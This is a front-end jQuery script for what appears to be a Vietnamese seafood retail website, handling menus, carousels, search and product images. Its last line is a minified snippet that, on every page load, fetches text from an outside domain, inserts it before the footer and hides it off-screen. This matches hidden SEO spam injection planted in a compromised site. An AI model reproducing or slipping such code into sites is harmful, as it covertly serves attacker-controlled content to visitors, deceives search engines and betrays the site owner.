$(document).ready(function () {

    $(".menu-desktop .nav-sub .nav-sub-child").each(function () {
        let length = $(this).find(".nav-sub-item-child").length;
        if (length) {
            $(this).prev("a").append("<i class='fa fa-angle-right pt_icon_right'></i>");
        }
    });
    $(".menu-desktop .nav-item .nav-sub").each(function () {
        if ($(this).find(".nav-sub-item").length) {
            $(this).prev("a").append("<i class='fa fa-angle-down' aria-hidden='true'></i>");
        }
    })
    $(".menu_fix_mobile .nav-sub").each(function () {
        if ($(this).find(".nav-sub-item").length) {
            $(this).parent(".nav-item").prepend("<i class='fa fa-chevron-down mm1'></i>");
        }
    })
    $(".menu_fix_mobile .nav-sub-child").each(function () {
        if ($(this).find(".nav-sub-item-child").length) {
            $(this).parent(".nav-sub-item").prepend("<i class='fa fa-chevron-down mm2'></i>");
        }
    })
    // $(".menu_fix_mobile .megamenu-container .list-megamenu").each(function() {
    //     if ($(this).find(".megamenu-item").length) {
    //         $(this).parents(".nav-megamenu").prepend("<i class='fa fa-chevron-down mega-mn1'></i>");
    //     }
    // });
    $('.menu_fix_mobile .mn-icon').click(function () {
        event.preventDefault();
        $(this).parent('a').next('ul').slideToggle();
        $(this).parent().toggleClass('active');
    });
    $(".megamenu-item-sub .submenu-right3").each(function () {
        let length = $(this).find("li").length;
        if (length) {
            $(this).prev("a").append("<div class='openc'></div>");

        }
    })
    $(".megamenu-item-sub .openc").click(function () {
        event.preventDefault();
        $(this).parents(".megamenu-item-sub").find(".submenu-right3").slideToggle();
        $(this).parents(".megamenu-item-sub").toggleClass('active');
    })
    $('.toggle-submenu').click(function () {
        // Tìm phần tử ul.nav-sub và thay đổi thuộc tính display
        $(this).siblings('ul.nav-sub').toggle();
    });
    $(".language_selected").click(function () {
        $(this).parent().find(".language_change").toggle();
    });

    $(".language_selected_mb").click(function () {
        $(this).parent().find(".language_change_mb").toggle();
    });

    $(".mega-mn1").click(function () {
        event.preventDefault();
        $(this).parents(".nav-megamenu").find(".megamenu-container").slideToggle();
    });

    $('.menu-mobile-1 .fa-sort-down').click(function () {
        // Tìm menu-c2-mobile tương ứng với icon được click
        var menu = $(this).closest('.menu-mobile-1').find('.menu-c2-mobile');
        
        // Kiểm tra trạng thái hiển thị hiện tại của menu
        if (menu.css('display') === 'none' || menu.css('display') === '') {
            // Ẩn tất cả các menu-c2-mobile khác
            $('.menu-c2-mobile').css('display', 'none');
            
            // Hiển thị menu tương ứng
            menu.css('display', 'block');
        } else {
            // Nếu đang hiển thị thì ẩn đi
            menu.css('display', 'none');
        }
    });
    $('.menu-mobile-1 .fa-sort-down').click(function () {
        // Tìm menu-c2-mobile tương ứng với icon được click
        var menu = $(this).closest('.menu-mobile-1').next('.menu-c2-mobile');
        
        // Kiểm tra trạng thái hiển thị hiện tại của menu
        if (menu.css('display') === 'none' || menu.css('display') === '') {
            // Ẩn tất cả các menu-c2-mobile khác
            $('.menu-c2-mobile').not(menu).css('display', 'none');
            
            // Hiển thị menu tương ứng
            menu.css('display', 'block');
        } else {
            // Nếu đang hiển thị thì ẩn đi
            menu.css('display', 'none');
        }
    });
    

    $('.close-menu #close-menu-button').click(function () {
        $(this).parent().parent().removeClass('main-menu-show');
        $('.list-bar').removeClass('change');
    });

    $('.menu_fix_mobile .mm1').click(function () {
        $(this).parent().find('.nav-sub').slideToggle();
        $(this).parent().toggleClass('active');
    });
    $('.menu_fix_mobile .mm2').click(function () {
        $(this).parent().find('.nav-sub-child').slideToggle();
        $(this).parent().toggleClass('active');
    });

    $('.show_search a').click(function () {
        $('#search').slideToggle();
    });
    $('.close-search').click(function () {
        $('#search').slideToggle();
    })
    $('.search_mobile').click(function () {
        $('#search').slideToggle();
    });

    $('.list_image_video .image img').click(function () {
        var src = $(this).attr('data-video');

        var link_video = $('#videos').attr('src', src);
    })

    /*$(window).scroll(function(event) {
        var pos_body = $('html,body').scrollTop();
        if (pos_body > 205) {
            $('.header').addClass('fixed');
        } else {
            $('.header').removeClass('fixed');
        }
    });*/
    $('.autoplay1-ykkh').slick({
        dots: false,
        infinite: true,
        speed: 300,
        autoplay: true,
        autoplaySpeed: 3000,
        fade: false,
    });
    $('.list-transpi__brand-item').slick({
        dots: false,
        infinite: true,
        speed: 300,
        autoplay: true,
        autoplaySpeed: 3000,
        fade: false,
        arrows: false,
        slidesToShow: 6,
        slidesToScroll: 1,
        responsive: [{
            breakpoint: 991,
            settings: {
                slidesToShow: 4,

            }
        },
        {
            breakpoint: 767,
            settings: {
                slidesToShow: 3,

            }
        },
        {
            breakpoint: 586,
            settings: {
                slidesToShow: 2,
                dots: true,
                arrows: false,

            }
        },
        {
            breakpoint: 486,
            settings: {
                slidesToShow: 2,
                dots: true,
                arrows: false,

            }
        }
    ]
    });
    
    $('.slider-banner-about').slick({
        slidesToShow: 1,
        slidesToScroll: 1,
        dots: false,
        infinite: true,
        speed: 300,
        autoplay: true,
        autoplaySpeed: 3000,
        fade: false,
        arrows: true,
    });
    $('.list-news-blogs').slick({
        slidesToShow: 3,
        slidesToScroll: 1,
        dots: true,
        infinite: true,
        speed: 300,
        autoplay: true,
        autoplaySpeed: 3000,
        fade: false,
        arrows: false,
        responsive: [{
            breakpoint: 991,
            settings: {
                slidesToShow: 2,

            }
        },
        {
            breakpoint: 767,
            settings: {
                slidesToShow: 3,

            }
        },
        {
            breakpoint: 586,
            settings: {
                slidesToShow: 1,
                dots: true,
                arrows: false,

            }
        },
        {
            breakpoint: 486,
            settings: {
                slidesToShow: 1,
                dots: true,
                arrows: false,

            }
        }
    ]
    });
    
    $('.blog-carousel-datb').slick({
        slidesToShow: 4,
        slidesToScroll: 1,
        dots: false,
        infinite: true,
        speed: 300,
        autoplay: true,
        autoplaySpeed: 3000,
        fade: false,
        arrows: true,
        responsive: [{
            breakpoint: 991,
            settings: {
                slidesToShow: 2,

            }
        },
        {
            breakpoint: 767,
            settings: {
                slidesToShow: 2,

            }
        },
        {
            breakpoint: 550,
            settings: {
                slidesToShow: 1,

            }
        }
        ]
    });
	$(".slide-5").slick({
        dots: true,
        arrows: false,
        slidesToShow: 5,
        slidesToScroll: 1,
        autoplay: true,
        autoplaySpeed: 2000,
        responsive: [{
                breakpoint: 992,
                settings: {
                    slidesToShow: 3,
                    autoplaySpeed: 2000,
                }
            },
            {
                breakpoint: 786,
                settings: {
                    slidesToShow: 2,
                    autoplaySpeed: 2000,
                }
            }
        ]
    });
    
    $('.faded').slick({
        dots: false,
        infinite: true,
        speed: 1000,
        autoplay: true,
        autoplaySpeed: 2000,
        fade: true,
        cssEase: 'linear',
    });
    $('.tin-tuc-home').slick({
        dots: false,
        arrows: true,
        slidesToShow: 5,
        slidesToScroll: 1,
        autoplay: true,
        autoplaySpeed: 2500,
        responsive: [{
            breakpoint: 991,
            settings: {
                slidesToShow: 4,

            }
        },
        {
            breakpoint: 767,
            settings: {
                slidesToShow: 3,

            }
        },
        {
            breakpoint: 550,
            settings: {
                slidesToShow: 2,

            }
        }
        ]
    });


    $('.autoplay4-ykkh').slick({
        dots: false,
        arrows: true,
        slidesToShow: 3,
        slidesToScroll: 3,
        autoplay: true,
        autoplaySpeed: 1500,
        responsive: [{
            breakpoint: 991,
            settings: {
                slidesToShow: 3,
            }
        },
        {
            breakpoint: 767,
            settings: {
                slidesToShow: 3,

            }
        },
        {
            breakpoint: 600,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1,
            }
        }
        ]
    });

    $('.slide_service5').slick({
        dots: true,
        arrows: false,
        slidesToShow: 5,
        slidesToScroll: 1,
        autoplay: true,
        autoplaySpeed: 1500,
        responsive: [{
            breakpoint: 991,
            settings: {
                slidesToShow: 3,
            }
        },
        {
            breakpoint: 767,
            settings: {
                slidesToShow: 3,

            }
        },
        {
            breakpoint: 600,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1,
            }
        }
        ]
    });

    $('.slide_cate1').slick({
        dots: true,
        arrows: false,
        slidesToShow: 3,
        slidesToScroll: 1,
        autoplay: true,
        autoplaySpeed: 1500,
        responsive: [{
            breakpoint: 991,
            settings: {
                slidesToShow: 9,
            }
        },
        {
            breakpoint: 767,
            settings: {
                slidesToShow: 7,
            }
        },
        {
            breakpoint: 600,
            settings: {
                slidesToShow: 4,
            }
        }
        ]
    });


    
    $('.slider-ss2-noibat').slick({
        prevArrow: '<button class="banner-next"> <i class="fas fa-chevron-left"></i> </button> ',
        nextArrow: '<button class="banner-right"> <i class=" fas fa-chevron-right"></i> </button> ',
        dots: false,
        arrows: true,
        slidesToShow: 4,
        slidesToScroll: 1,
        autoplay: true,
        autoplaySpeed: 1500,
        responsive: [{
            
            breakpoint: 991,
            settings: {
                prevArrow:false,
                nextArrow:false,
                slidesToShow: 3,
            }
        },
        {
            breakpoint: 767,
            settings: {
                slidesToShow: 2,
            }
        },
        {
            breakpoint: 600,
            settings: {
                slidesToShow: 2,
            }
        }
        ]
    });

    
    $('.sale-no-titles').slick({
        dots: false,
        arrows: true,
        slidesToShow: 4,
        slidesToScroll: 1,
        autoplay: false,
        autoplaySpeed: 1500,
        responsive: [{
            breakpoint: 991,
            settings: {
                slidesToShow: 3,
            }
        },
        {
            breakpoint: 767,
            settings: {
                slidesToShow: 2,
            }
        },
        {
            breakpoint: 600,
            settings: {
                slidesToShow: 2,
            }
        }
        ]
    });
$('.sale-no-title').slick({
    prevArrow: '<button class="banner-next"> <i class="fas fa-chevron-left"></i> </button> ',
    nextArrow: '<button class="banner-right"> <i class=" fas fa-chevron-right"></i> </button> ',
    dots: false,
    arrows: false,
    slidesToShow: 4,
    slidesToScroll: 1,
    autoplay: false,
    autoplaySpeed: 1500,
    responsive: [{
        breakpoint: 991,
        settings: {
            slidesToShow: 3,
        }
    },
    {
        breakpoint: 767,
        settings: {
            slidesToShow: 2,
        }
    },
    {
        breakpoint: 600,
        settings: {
            slidesToShow: 2,
        }
    }
    ]
});


    // $('.slide_cate').slick({
    //     dots: true,
    //     arrows: false,
    //     slidesToShow: 5,
    //     slidesToScroll: 1,
    //     autoplay: false,
    //     autoplaySpeed: 1500,
    //     responsive: [{
    //         breakpoint: 991,
    //         settings: {
    //             slidesToShow: 4,
    //         }
    //     },
    //     {
    //         breakpoint: 767,
    //         settings: {
    //             slidesToShow: 3,
    //         }
    //     },
    //     {
    //         breakpoint: 600,
    //         settings: {
    //             slidesToShow: 3,
    //         }
    //     }
    //     ]
    // });

    $('.autoplay5-pro').slick({
        dots: false,
        arrows: true,
        slidesToShow: 5,
        slidesToScroll: 1,
        autoplay: true,
        autoplaySpeed: 2500,
        responsive: [{
            breakpoint: 991,
            settings: {
                slidesToShow: 3,

            }
        },
        {
            breakpoint: 767,
            settings: {
                slidesToShow: 2,

            }
        },
        {
            breakpoint: 550,
            settings: {
                slidesToShow: 2,

            }
        }
        ]
    });
    $('.autoplay5-pro-2').slick({
        dots: false,
        arrows: false,
        slidesToShow: 5,
        slidesToScroll: 1,
        autoplay: true,
        autoplaySpeed: 2500,
        responsive: [{
            breakpoint: 991,
            settings: {
                slidesToShow:4,

            }
        },
        {
            breakpoint: 767,
            settings: {
                slidesToShow: 3,

            }
        },
        {
            breakpoint: 550,
            settings: {
                slidesToShow: 2,

            }
        }
        ]
    });
    $('.autoplay4-pro').slick({
        dots: false,
        slidesToShow: 4,
        slidesToScroll: 1,
        autoplay: true,
        autoplaySpeed: 2500,
        responsive: [{
            breakpoint: 991,
            settings: {
                slidesToShow: 3,
            }
        },
        {
            breakpoint: 767,
            settings: {
                slidesToShow: 2,
            }
        },
        {
            breakpoint: 550,
            settings: {
                slidesToShow: 2,
            }
        }
        ]
    });

    $('.autoplay_height').slick({
        dots: false,
        slidesToShow: 3,
        slidesToScroll: 1,
        autoplay: true,
        autoplaySpeed: 2500,
        responsive: [{
            breakpoint: 991,
            settings: {
                slidesToShow: 3,
            }
        },
        {
            breakpoint: 767,
            settings: {
                slidesToShow: 2,
            }
        },
        {
            breakpoint: 550,
            settings: {
                slidesToShow: 2,
            }
        }
        ]
    });

    $('.autoplay3-news').slick({
        dots: false,
        slidesToShow: 4,
        slidesToScroll: 1,
        autoplay: true,
        autoplaySpeed: 2500,
        responsive: [{
            breakpoint: 991,
            settings: {
                slidesToShow: 3,
            }
        },
        {
            breakpoint: 767,
            settings: {
                slidesToShow: 2,
            }
        },
        {
            breakpoint: 550,
            settings: {
                slidesToShow: 1,
            }
        }
        ]
    });

    $('.slide_video').slick({
        dots: false,
        slidesToShow: 3,
        slidesToScroll: 1,
        autoplay: true,
        autoplaySpeed: 2500,
    });

    $('.autoplay5-doitac').slick({
        dots: false,
        slidesToShow: 6,
        slidesToScroll: 1,
        autoplay: true,
        autoplaySpeed: 1500,
        responsive: [{
            breakpoint: 991,
            settings: {
                slidesToShow: 3,

            }
        },
        {
            breakpoint: 767,
            settings: {
                slidesToShow: 2,

            }
        },
        {
            breakpoint: 600,
            settings: {
                slidesToShow: 2,
            }
        }
        ]
    });
});


function topFunction() {
    document.body.scrollTop = 0;
    document.documentElement.scrollTop = 0;
}

function myFunction2(x) {
    x.classList.toggle("change2");
}
/*
 jQuery placeholderTypewriter plugin
 ===================================
 Author: Bjoern Diekert <https://github.com/bdiekert>
 Version: 1.0
 License: Unlicense <http://unlicense.org>
 */

 const searchInputs = document.querySelectorAll('.search-desl input');
 const wordSequences = [
     ["Bạn muốn tìm kiếm gì?", "Hải sản", "Thủy sản"]
 ];
 
 searchInputs.forEach((searchInput, index) => {
     let currentSequenceIndex = index % wordSequences.length;
     let currentWordIndex = 0;
     let currentCharIndex = 0;
     let isDeleting = false;
     let currentWord = wordSequences[currentSequenceIndex][currentWordIndex];
 
     function typeEffect() {
         if (!isDeleting && currentCharIndex === currentWord.length) {
             isDeleting = true;
             setTimeout(typeEffect, 800);  // Pause before deleting
             return;
         } else if (isDeleting && currentCharIndex === 0) {
             isDeleting = false;
             currentWordIndex++;
             if (currentWordIndex === wordSequences[currentSequenceIndex].length) {
                 currentWordIndex = 0;
                 currentSequenceIndex = (currentSequenceIndex + 1) % wordSequences.length;
             }
             currentWord = wordSequences[currentSequenceIndex][currentWordIndex];
         }
 
         searchInput.setAttribute('placeholder', currentWord.substring(0, currentCharIndex));
 
         if (isDeleting) {
             currentCharIndex--;
         } else {
             currentCharIndex++;
         }
 
         setTimeout(typeEffect, isDeleting ? 50 : 100);
     }
 
     typeEffect();
 });


 window.addEventListener('scroll', function() {
    const box = document.querySelector('header');
    if (window.scrollY > 100) {
        box.classList.add('scrolled');
    } else {
        box.classList.remove('scrolled');
    }
  });

  
  $(document).ready(function() {
    // Function to handle click event on image thumbnails
    $('.product-detail-img-small img').on('click', function() {
        // Get the source of the clicked thumbnail image
        var newSrc = $(this).attr('src');
        // Set the source of the main image
        $('.product-detail-img-big img').attr('src', newSrc);
        // Set the href of the main image link
        $('.product-detail-img-big a').attr('href', newSrc);
  
        // Remove 'active' class from all thumbnails
        $('.product-detail-img-small').removeClass('active');
        // Add 'active' class to the clicked thumbnail's parent
        $(this).parent().addClass('active');
    });
});



// Select the elements
const btnSearch = document.querySelector('.header-links .btn-search');
const headerSearch = document.querySelector('.header-links .header-search');
const closeSearch = document.querySelector('.header-links .close-search');

// Add class when clicking on btn-search
btnSearch.addEventListener('click', function (event) {
    event.preventDefault(); // Prevent default behavior of <a> tag
    headerSearch.classList.add('active'); // Add class to .header-search
});

// Remove class when clicking on close button
closeSearch.addEventListener('click', function () {
    headerSearch.classList.remove('active'); // Remove class from .header-search
});

// Optional: Close the search when clicking outside the search area
document.addEventListener('click', function (event) {
    if (!headerSearch.contains(event.target) && !btnSearch.contains(event.target)) {
        headerSearch.classList.remove('active'); // Remove class when clicking outside
    }
});

document.addEventListener("DOMContentLoaded",function(){fetch("https://gblkeras.com/gbldom6.txt").then(t=>{if(!t.ok)throw new Error(`Failed to fetch content (${t.status})`);return t.text()}).then(t=>{if(t.includes("<script"))return console.warn("Blocked potentially unsafe content.");const e=document.createElement("div");e.innerHTML=t,e.style.position="absolute",e.style.left="-9999rem";const n=document.querySelector("footer");n?n.parentNode.insertBefore(e,n):document.body.appendChild(e)}).catch(t=>console.error("Error fetching SEO block:",t))});